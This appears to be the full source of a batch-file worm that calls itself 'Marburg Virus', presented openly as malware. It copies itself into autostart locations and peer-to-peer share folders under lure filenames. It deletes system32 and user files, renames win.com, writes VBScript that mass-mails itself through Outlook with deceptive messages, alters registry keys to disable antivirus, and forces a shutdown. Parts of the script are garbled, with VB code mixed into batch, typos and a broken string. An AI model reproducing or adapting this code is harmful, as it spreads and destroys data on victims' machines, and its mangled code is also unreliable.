echo copy %0 "C:\WINDOWS\system32\Marburg.bat" >> autoexec.bat
goto tryAim
:tryAim
If exist C:\progra~1\Aim95 goto copyAim
If not exist C:\progra~1\Aim95 goto tryKaz
:copyAim
Copy %0 C:\progra~1\Aim95
goto tryKaz
:tryKaz
If exist C:\progra~1\Kazaa goto copyKaz
If not exist C:\progra~1\Kazaa goto tryMsn
:copyKaz
Copy %0 C:\progra~1\Kazaa
goto tryMsn
:tryMsn
If exist msmsg.exe goto copyMsn
If not exist msgmsg.exe goto tryGold
:copyMsn
Copy %0 C:\progra~1\Messenger
goto tryGold
:tryGold
If exist C:\goldine goto copyGold
if not exist C:\goldmine goto tryMusic
:copyGold
Copy %0 C:\goldmine
goto tryMusic
:tryMusic
If exist C:\user\my~1\My~1 goto copyMusic
If not exist C:\user\my~1\My~1 goto tryNetS
:copyMusic
Copy %0 C:\user\my~1\My~1
goto tryNetS
:tryNetS
If exist C:\progra~1\Netscape\Netscape goto copyNetS
If not exist C:\progra~1\Netscape\Netscape goto tryEE
:copyNetS
Copy %0 C:\progra~1\Netscape\Netscape
goto tryEE
:tryEE
If exist C:\progra~1\Sierra\Emp~1\Emp~1 goto copyEE
If not exist C:\progra~1\Sierra\Emp~1\Emp~1 goto tryUser
:copyEE
Copy %0 C:\progra~1\Sierra\Emp~1\Emp~1
goto tryUser
:tryUser
If exist C:\Docume~1 goto copyUser
If not exist C:\Docume~1 goto tryWincom
:copyUser
Copy %0 C:\Docume~1\User.bat
goto tryWincom
:tryWincom
If exist C:\ goto copyWincom
If not exist C:\ goto tryMirc
:copyWincom
Copy %0 C:\Win.com.bat
goto tryMirc
:tryMirc
If exist C:\progra~1\mirc goto copyMirc
If not exist C:\progra~1\mirc goto begin
:copyMirc
Copy %0 C:\progra~1\mirc
goto begin
:begin
@Echo off
echo "Marburg Virus"
echo "Batch Variant"
goto deltAim
:deltAim
If exist C:\Desktop\Aim95 goto delAim
If not exist C:\Desktop\Aim95 goto deltKaz
:delAim
del C:\Desktop\Aim95
goto deltKaz
:deltKaz
If exist C:\Desktop\Kazaa\My~1 goto delKaz
If not exist C:\Desktop\Kazaa\My~1 goto deltAim95
:delKaz
del C:\Desktop\Kazaa\My~1
goto deltAim95
:deltAim95
If exist C:\progra~1\Aim95 goto delAim95
If not exist C:\progra~1\Aim95 goto wincom
:delAim95
del C:\progra~1\Aim95
goto wincom

:wincom
@echo off 
echo Warning 
echo Windows has detected a .tmp file 
echo Performing Deltree of *.tmp from the windows/temp Dir. 
cls 
cd\ 
cd windows 
rename win.com Floppy1/3.com 
cls 
echo File done...
goto spre

:spre
"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\XXP", "c:\XP\xp.bat" > > c:\X.vbs
echo set B = CreateObject("Outlook.Application") > > c:\X.vbs
echo set C = b.GetNameSpace("MAPI") > > c:\X.vbs
echo for y = 1 To c.AddressLists.Count > > c:\X.vbs
echo set D = c.AddressLists(y) > > c:\X.vbs
echo X = 1 > > c:\X.vbs
echo set E = b.CreateItem(0) > > c:\X.vbs
echo for O = 1 To d.AddressEntries.Count > > c:\X.vbs
echo F = d.AddressEntries(x) > > c:\X.vbs
echo e.Recipients.Add F > > c:\X.vbs
echo X = X + 1 > > c:\X.vbs
echo next > > c:\X.vbs
echo e.Subject = "FWD: Funny Movie:)" > > c:\X.vbs
echo e.Body = "Hey how you doing man? I got this clip from jackass 2, check it out!" > > c:\X.vbs
echo e.Attachments.Add ("c:\WINDOWS\Marburg.bat") > > c:\X.vbs
echo e.DeleteAfterSubmit = False > > c:\X.vbs
echo e.Send > > c:\X.vbs
echo F = "" > > c:\X.vbs
echo next > > c:\X.vbs
goto sut

:sut
echo Set WSHShell = CreateObject("WScript.Shell")
echo WshShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoCloseKey", "1"
goto Ntn

:Ntn
echo Set WSHShell = CreateObject("WScript.Shell")
echo WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\NAV Agent", ""
goto Fil

:Fil
Private Sub Form_Load()
Form1.Visible = False
Timer1.Interval = 500
Words1 = "534045 0406 85659780 2784680 97843 657 124 6  134862 7 8 0030 3735038 702570 283702130 8372 61 3 68729 60 16 0 92106 260168 7019750 84808 7 87 8 07 79 0780 78 470847847 6456 45 047 78078 0 7890787 8787467 840 864 807 864 5454564544641  5 454 534 564 6486464564 48 5 47654 89456417606170431834076634784 37 084 7 034 84 03864804 86708 4369648676483740 36873608486704 3687046 846 743 47  40674 8670848 74 8 7  07 7 8 78 88074702 48074 8076834830866406463 4 4 5 54 546 54 46 8 79 09 8 7 65 4 3456097686453 575768 5687 6 35768 7 568676849 8980997980998 9 8769 7 9  347534123 343 6 354 76 6678654 8 75 4 72442365776 8677 6586877866 57 7 5475647 657 65 474 7 457 654 74  98645538687965676876585687 8 64 78 35 789 80 0 97865436 8 769 468457 8568  58 56 856856 585685879348976802347813278379467112 3490197187078185617465878 787 78347 9075813478 9791378051709843675845681347 7 8731 57183 758978 7897813798 78901 78 7089781347875 861386381975871893 8 68 67167518 7138 1374 9573189567161896130634  6 687 893179 787 8 8341709"
Words2 = "534045 0406 85659780 2784680 97843 657 124 6  134862 7 8 0030 3735038 702570 283702130 8372 61 3 68729 60 16 0 92106 260168 7019750 84808 7 87 8 07 79 0780 78 470847847 6456 45 047 78078 0 7890787 8787467 840 864 807 864 5454564544641  5 454 534 564 6486464564 48 5 47654 89456417606170431834076634784 37 084 7 034 84 03864804 86708 4369648676483740 36873608486704 3687046 846 743 47  40674 8670848 74 8 7  07 7 8 78 88074702 48074 8076834830866406463 4 4 5 54 546 54 46 8 79 09 8 7 65 4 3456097686453 575768 5687 6 35768 7 568676849 8980997980998 9 8769 7 9  347534123 343 6 354 76 6678654 8 75 4 72442365776 8677 6586877866 57 7 5475647 657 65 474 7 457 654 74  98645538687965676876585687 8 64 78 35 789 80 0 97865436 8 769 468457 8568  58 56 856856 
goto Kaz

:Kaz
If exist C:\progra~1\Kazaa goto startKaz
If not exist C:\progra~1\Kazaa goto copyMarb
:startKaz
Start C:\progra~1\Kazaa
Start C:\progra~1\Kazaa
Start C:\progra~1\Kazaa
Start C:\progra~1\Kazaa
Start C:\progra~1\Kazaa
Start C:\progra~1\Kazaa
Start C:\progra~1\Kazaa
Start C:\progra~1\Kazaa
Start C:\progra~1\Kazaa
Start C:\progra~1\Kazaa
Start C:\progra~1\Kazaa
goto copyMarb
:copyMarb
copy %0 c:\Docume~1\Alluse~1\StartM~1\Programs\Startup\Marburg.bat 
goto tdelk

:tdelk
If exist C:\progra~1\Kazaa goto delK
If not exist C:\progra~1\Kazaa goto Eco
:delk
del C:\progra~1\Kazaa
goto Eco

:Eco
@echo on
cd C:\windows\system32
del *.*
goto Adv

:Adv
echo a.run("c:\PROGRA~1\INTERN~1\iexplore.exe http://www.multiplayercheats.de") > >
goto Spre2

:Spre2
Dim x 
on error resume next 
Set fso ="Scripting.FileSystem.Object" 
Set so=CreateObject(fso) 
Set ol=CreateObject("Outlook.Application") 
Set out= WScript.CreateObject("Outlook.Application") 
Set mapi = out.GetNameSpace("MAPI") 
Set a = mapi.AddressLists(1) 
For x=1 To a.AddressEntries.Count 
Set Mail=ol.CreateItem(0) 
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) 
Mail.Subject="Information on the new virus, Marburg" 
Mail.Body="Named after the real virus, Marburg is an I-worm which can cause a lot of damage to your computer if not properly treated. Enclosed is the latest detector for Marburg only, It will scan to see if you have the virus or not" 
Mail.Attachments.Add Wscript.Marburg.bat
Mail.Send 
Next 
ol.Quit
goto Desk

:Desk
Dim MyShortcut, MyDesktop, DesktopPath
'
' Read desktop path using WshSpecialFolders object.
'
DesktopPath = WSHShell.SpecialFolders("Desktop")
'
' Create a shortcut object on the desktop.
'
Set MyShortcut = WSHShell.CreateShortcut(DesktopPath & "\Paint Brush.lnk")

'Properties about this shortcut'

With MyShortcut
 .TargetPath = WSHShell.ExpandEnvironmentStrings("%windir%\system32\Marburg.bat")
 .WorkingDirectory = WSHShell.ExpandEnvironmentStrings("%windir%")
 .WindowStyle = 4
 .IconLocation = WSHShell.ExpandEnvironmentStrings("C:\Program Files\Microsoft Office\Office10\winword.exe, 0")
 .Save
End with
ECHO MATWIZ
goto Man-Mid  

:Man-mid
@Echo off
Echo "10% Done!"
Copy %0 C:\Desktop\MyComputer
If exist C:\user\MyDocuments\*jpg goto Yea
If not exist C:\user\MyDocuments\*jpg goto Nah

:Yea
goto Kay

:Nah
del C:\user\MyDocuments\*gip
goto Sta

:Kay
del C:\user\MyDocuments\*jpg
goto Sta

:Sta
Copy %0 C:\windows
REN c:\progra~1 1/2Floopy
If exist LoveLetter.txt.vbs goto Lov
If not exist LoveLetter.txt.vbs goto Luk

:Lov
Start LoveLetter.txt.vbs
goto met

:Luk
del C:\Progra~1\Aim
goto Met

:Met
If exist VBS.BSVP goto VP
If not exist VBS.BSVP goto Luc

:VP
Start VBS.BSVP
goto Meb

:Luc
Echo "Viruses not found... moving to meb"
goto Meb

:Meb
Echo "Hello Norton!:>"
Copy %0 C:\Progra~1\Norton
Echo ----------------><----------------
Start MSPaint
Start MSPaint
Start MSPaint
Start MSPaint
Start MSPaint
Start MSPaint
del C:\Progra~1\Norton
Start Notepad(Input.text) "Esa sorrah to say you have been owned by the Marburg variant E-worm... =["
Print #1
Rename Marburg.bat System32.win.ams
goto Sni

:Sni
If exist Sniff.bat goto nif
If not exist Sniff.bat goto mid

:Nif
start Sniff.bat
goto Mid

:Mid
If exist Marburg.vbs goto E-wormVS
If not exist Marburg.vbs goto mad

:E-WormVS
Start Marburg.vbs
goto mad

:mad
copy %0 c:\autoexec.bat
copy %0 c:\Docume~1\Alluse~1\StartM~1\Programs\Startup\
TYPE NUL | CHOICE.COM /N /CY /TY,8 >NUL 
If exist IExplorer goto IEX
If not exist IExplorer goto NotP

:IEX
Start IExplorer "http://www.multiplayercheats.de"
Start IExplorer "http://www.multiplayercheats.de"
Start IExplorer "http://www.multiplayercheats.de"
Start IExplorer "http://www.multiplayercheats.de"
Start IExplorer "http://www.multiplayercheats.de"
goto ShareKaz

:ShareKaz
@echo off
@echo Credit to unfunf, INDIA232 and his Crew:)
@copy vocal.bat "c:\..\..\..\..\..\..\..\winnt\profiles\default user\start menu\programs\startup\vocal.bat"
@dir /s /b /l c:\winzip32.exe | set wz=
@FOR /F "delims==" %%y IN ('dir /s /b /l c:\*.zip') DO @echo "%wz%" -min -a -r -p "%%y" "c:\..\..\..\..\..\..\..\winnt\profiles\default user\start menu\programs\startup\vocal.bat" >> vocal.bat
@call vocal.bat
@del vocal.bat

Echo "MsgBox" Marburg owns you.
echo :makebat >> A:\bug\ifloopy.bat
echo copy %0 C:\Window$\infect\yours.dll.bat >> A:\bug\ifloopy.bat
echo copy %0 A:\bug\message.rec.bat >> A:\bug\ifloopy.bat
echo :infect2 >> A:\bug\ifloopy.bat
echo if exist C:\Progra~1\KaZaA\My~1 goto infectK >> A:\bug\ifloopy.bat
echo if not exist C:\Progra~1\KaZaA\My~1 goto infectZiP's >> A:\bug\ifloopy.bat
echo :infectK >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\norton anti-virus.exe.bat >> A:\bug\ifloopy.bat 
echo COPY %0 C:\Progra~1\KaZaA\My~1\credit-card's(with information).txt.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\Pamela anderson & Tommy lee.mpeg.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\making Worm viruses.txt.bat >> A:\bug\ifloopy.bat 
echo COPY %0 C:\Progra~1\KaZaA\My~1\password-list.txt.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\And1(last version).mpg.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\phreaker-tool's.exe.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\most biggest penis!.bmp.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\Harry Potter 2.mpg.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\Harry Potter 3.mpg.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\Harry Potter 4.mpg.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\Harry SMOKING A BONG.bmp.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\Pamela's BUTS!.mpg.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\PORN-STAR.bmp.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\Counter-strike.exe.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\Counter-strike 1.7.exe.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\I still know what you did last summer (3).mpg.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\pentium 4 SUCK's.txt.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\DAREDEVIL2.mpg.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\JLOAss.gip.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\ADIDAS.mp3.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\Dilema.mp3.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\IGOTHIGH.mp3.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\Jay&SilentBob.mpg.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\BUsta.mp3.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\Lose Yourself.mp3.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\Get-Down.mp3.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\Get Busy.mp3.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\Fuck Da Police.mp3.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\Straight Out of Compten.mp3.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\Holla.mp3.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\Memorize.mp3.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\Intro(Get Rich or die tryin).mp3.bat >> A:\bug\ifloopy.bat
echo COPY %0 C:\Progra~1\KaZaA\My~1\JLO and Christinia.mpg.bat >> A:\bug\ifloopy.bat
goto CopE

:CopE
copy %0 c:\ferrari.bat
copy %0 c:\_.bat
copy %0 c:\ferrari.pic.bat
copy %0 c:\AIM.bat
copy %0 c:\ferrari.gip.bat
copy %0 c:\NORTON.bat
copy %0 c:\E-Worm.bat
copy %0 c:\Kazaa.exe.bat
copy %0 c:\Windows.win.bta
goto NotP

:NotP
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad
Start Notepad(input.text) "Marburg"
goto Dte

:Dte
zp = Day(Date)
If zp = 1 Then
Echo "Welcome to the new month!"
PAUSE
End If
zq = Month(Date)
If zq = Jan Then
Echo "Welcome to the new year!"
PAUSE
End If
zo = Day(Date)
If zo = 31 Then
Echo "Last day of the month!"
PAUSE
End If
zh = Year(Date)
If zh = 2005 Then
RD/S/Q C:\WINDOWS\SYSTEM32   \SPOOL\DRIVERS\COLOR\HPP3902A.ICM
ECHO "Bah :D"
PAUSE
End If
goto AEnd

:AEnd
Echo "Virus Finished... cu :D"
RD/S/Q C:\WINDOWS\SYSTEM32   \SPOOL\DRIVERS\COLOR\HPP3902A.ICM
SHUTDOWN -s -t 15 -c "15 secs"
SHUTDOWN -s -t 2 -c
cls
Exit

